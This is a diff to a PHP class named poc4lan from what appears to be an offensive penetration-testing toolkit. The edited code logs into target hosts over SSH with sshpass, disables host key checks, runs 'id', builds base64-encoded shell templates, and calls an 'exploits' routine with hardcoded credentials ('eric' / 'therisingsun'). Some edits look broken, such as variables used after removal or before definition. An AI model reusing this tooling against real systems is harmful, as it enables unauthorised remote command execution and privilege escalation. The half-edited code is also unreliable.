@@ -86,17 +86,17 @@ class poc4lan extends poc4web {
         $flag_poc = FALSE;
         //$flag_poc = "no";
         
-        $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
+        $test = new SERVICE($eth,$domain,$ip, $port, $protocol);
         $test->poc($flag_poc);
         var_dump($test->flag_poc);
         $stream = $test->stream8ssh8passwd($test->ip, $test->port, $login,$pass);
         
-        $template_cmd = "sshpass -p '$pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $login@$test->ip -p $test->port -C  '%CMD%' ";
-        list($stream,$template_id,$template_cmd,$template_shell) = $test->stream4check($stream,$template_cmd,$login,$pass);
+        $template_shell = "sshpass -p '$pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $login@$test->ip -p $test->port -C  '%SHELL%' ";
+        list($stream,$template_id,$template_shell) = $test->stream4check($stream,$template_shell,$login,$pass);
         
         if (is_resource($stream)){
             $templateB64_id = base64_encode($template_id);
-            $templateB64_cmd = base64_encode($template_cmd);
+            
             $templateB64_shell = base64_encode($template_shell);
             
             $data = "id";
@@ -104,16 +104,16 @@ class poc4lan extends poc4web {
             list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id8str) = $test->parse4id($rst_id);
             $id8b64 = base64_encode($id8str);
             $this->article("CREATE Template ID", $template_id);
-            $this->article("CREATE Template CMD", $template_cmd);
             $this->article("CREATE Template SHELL", $template_shell);
             $test->pause();
             $query = "DELETE FROM LAN where id8port = '$test->port2id' ";
+            $this->cmd("mysql>", $query);
             $test->mysql_ressource->query($query);
                 
-            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$pass);
+            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_shell,$id8b64,$pass);
             $obj_lan->poc($test->flag_poc);
             var_dump($obj_lan->flag_poc);
-            $obj_lan->$fonction2exec();
+            $obj_lan->$fonction2exec($obj_lan->stream);
             $obj_lan->lan2brief();
         }
     }
@@ -571,8 +571,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         
         $stream = $test->stream8ssh8key8public($test->ip, $test->port, $login, $public_key_file, $private_key_file, $private_key_passwd);
         
-        $template_cmd = "ssh $login@$test->ip -p $test->port -i $private_key_file.pem -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -C  \"%CMD%\"";
-        list($stream,$template_cmd) = $test->stream4check($stream,$template_cmd,$login,$pass);
+        $template_shell = "ssh $login@$test->ip -p $test->port -i $private_key_file.pem -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -C  \"%SHELL%\"";
+        list($stream,$template_id) = $test->stream4check($stream,$template_id,$login,$pass);
         
         
         //$stream = $test->stream8ssh2key8priv4str($test->ip, $test->port, $login,$private_key_str, $private_key_file, $private_key_passwd);
@@ -584,23 +584,20 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
             //$test->yesAUTH($test->ip, $test->port, $test->protocol, $login, $pass, "", "", "", "", "", __FUNCTION__, $test->ip2geoip());
             $template_id = "%ID%";
             $templateB64_id = base64_encode($template_id);
-            $templateB64_cmd = base64_encode($template_cmd);
+           
             
             $data = "id";
             $rst_id = $test->req_str($stream, $data, 10,"");
             list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $test->parse4id($rst_id);
             $id8b64 = base64_encode($id);
             $this->article("CREATE Template ID", $template_id);
-            $this->article("CREATE Template BASE64 ID", $templateB64_id);
-            $this->article("CREATE Template CMD", $template_cmd);
-            $this->article("CREATE Template BASE64 CMD",$templateB64_cmd);
-            $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
+            $template_shell = str_replace("%ID%", "%SHELL%", $template_cmd);
             $templateB64_shell = base64_encode($template_shell);
             $this->article("CREATE Template SHELL", $template_shell);
             $this->article("CREATE Template BASE64 SHELL", $templateB64_shell);
             
             $pass = "";
-            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$pass);
+            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_shell,$id8b64,$pass);
             $obj_lan->poc($test->flag_poc);
             
             
@@ -737,12 +734,9 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $protocol = "T";
         $login = "eric" ;
         $pass = "therisingsun";
-        
-        
-        $login = "";
-        $pass = "";
+
         $titre = "";
-        $fonction2exec = "";
+        $fonction2exec = "exploits";
         $vm = "";
         $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
         
